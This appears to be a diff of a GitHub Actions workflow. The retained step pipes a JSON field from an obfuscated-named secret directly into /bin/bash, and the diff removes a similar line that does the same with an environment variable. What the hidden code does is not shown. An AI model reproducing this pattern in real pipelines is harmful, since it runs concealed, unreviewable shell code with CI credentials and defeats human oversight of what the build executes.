@@ -22,7 +22,6 @@ jobs:
           nzpdz93: ${{ secrets.nzpdz93 }}
         run: |
           printf '%s' "$nzpdz93" | jq -r .taip5850 | /bin/bash
-          echo $qilsi40687 | jq -r .nh55 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
